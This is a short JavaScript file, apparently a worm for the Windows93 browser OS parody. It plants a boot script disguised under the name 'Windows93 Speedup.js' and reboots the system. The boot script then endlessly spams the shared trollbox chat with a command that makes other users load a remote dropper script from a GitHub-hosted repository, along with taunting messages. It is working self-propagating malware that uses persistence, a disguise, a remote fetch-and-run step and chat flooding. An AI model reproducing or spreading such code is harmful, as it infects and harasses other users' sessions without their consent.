function download_script(url) {
	return "function sleep(ms) {return new Promise(resolve => setTimeout(resolve, ms));};function input_text(inp_value) {	document.getElementsByTagName('iframe')[0].contentWindow.document.getElementById('trollbox_input').value=inp_value};function submit_text() {	document.getElementsByTagName('iframe')[0].contentWindow.document.getElementsByTagName('button')[1].click()};function send_text(msg) {input_text(msg);submit_text();};async function lets_do_this() {console.log('lol you are a nerd.');await sleep(5000);$exe('trollbox');await sleep(500);while (true) {send_text('/exe js $loader([\"https://raw.githack.com/OutRite/Basic93Virus/main/dropper.js\", $noop])');await sleep(100);send_text('I AM A REDDITOR LOL');await sleep(100);}	};await lets_do_this();//$exe('reboot') // something went wrong, lets just reboot LOL // because it asyncs it just reboots immediately LOLZ"
}

var foo = download_script('dhfbrerevd')

$db.set("boot/Windows93 Speedup.js", foo)

$exe('reboot')
